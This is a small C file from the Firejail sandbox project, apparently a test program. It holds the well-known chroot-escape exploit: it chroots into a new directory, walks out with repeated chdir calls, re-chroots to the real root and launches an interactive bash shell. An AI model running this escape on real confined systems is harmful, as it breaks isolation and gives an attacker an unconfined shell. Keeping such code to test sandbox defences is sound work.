// This file is part of Firejail project
// Copyright (C) 2014-2024 Firejail Authors
// License GPL v2

// simple unchroot example from http://linux-vserver.org/Secure_chroot_Barrier
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

void die(char *msg) {
	perror(msg);
	exit(1);
}

int main(int argc, char *argv[])
{
	int i;

	if (chdir("/") != 0)
		die("chdir(/)");

	if (mkdir("baz", 0777) != 0)
		; //die("mkdir(baz)");

	if (chroot("baz") != 0)
		die("chroot(baz)");

	for (i=0; i<50; i++) {
		if (chdir("..") != 0)
			die("chdir(..)");
	}

	if (chroot(".") != 0)
		die("chroot(.)");

	printf("Exploit seems to work. =)\n");

	execl("/bin/bash", "bash", "-i", (char *)0);
	die("exec bash");

	exit(0);
}
